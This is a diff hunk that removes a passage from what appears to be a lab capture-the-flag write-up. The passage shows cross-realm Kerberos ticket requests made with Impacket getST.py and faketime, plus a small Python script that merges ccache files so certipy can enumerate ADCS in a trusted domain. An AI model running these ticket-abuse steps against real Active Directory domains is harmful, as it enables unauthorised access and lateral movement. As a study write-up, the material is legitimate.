@@ -1225,60 +1225,7 @@ permission: CREATE_CHILD
 
 Now using that TGT in bloodyAD i can see the same thing
 
-But now to look into ADCS ill need to repeat the same process as earlier since certipy also does not do the cross-realm refferal chain
 
-```python
-❯❯❯ export KRB5CCNAME=r.martinelli.ccache
-
-❯❯❯ faketime -f +8h getST.py -k -no-pass -dc-ip 192.168.2.2 'pong.htb/r.martinelli' -spn 'krbtgt/PING.HTB'
-Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Getting ST for user
-[*] Saving ticket in r.martinelli@krbtgt_PING.HTB@PONG.HTB.ccache
-
-❯❯❯ export KRB5CCNAME=r.martinelli@krbtgt_PING.HTB@PONG.HTB.ccache
-
-❯❯❯ faketime -f +8h getST.py -k -no-pass -dc-ip 192.168.2.1 'ping.htb/r.martinelli' -spn 'HOST/dc1.ping.htb'
-Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Getting ST for user
-[*] Saving ticket in r.martinelli@HOST_dc1.ping.htb@PING.HTB.ccache
-```
-
-Now this final ticket i get i can use with certipy
-
-```python
-❯❯❯ export KRB5CCNAME=r.martinelli@HOST_dc1.ping.htb@PING.HTB.ccache
-```
-
-But after exporting the new ticket and trying certipy it still fails
-
-After some research i see its becuase of this ticket only containing `HOST/dc1.ping.htb`, so i essentially need to merge the two tickets
-
-```python
-❯❯❯ cat merge.py           
-from impacket.krb5.ccache import CCache
-
-home = CCache.loadFile('r.martinelli.ccache')
-cross = CCache.loadFile('r.martinelli@HOST_dc1.ping.htb@PING.HTB.ccache')
-
-home.credentials.extend(cross.credentials)
-home.saveFile('r.martinelli_combined.ccache')
-```
-
-Ill get AI to make the script for me
-
-```python
-❯❯❯ python3 merge.py
-```
-
-Ill then run the script to create the new ticket
-
-```python
-❯❯❯ export KRB5CCNAME=r.martinelli_combined.ccache
-
-
-```
 
 
 
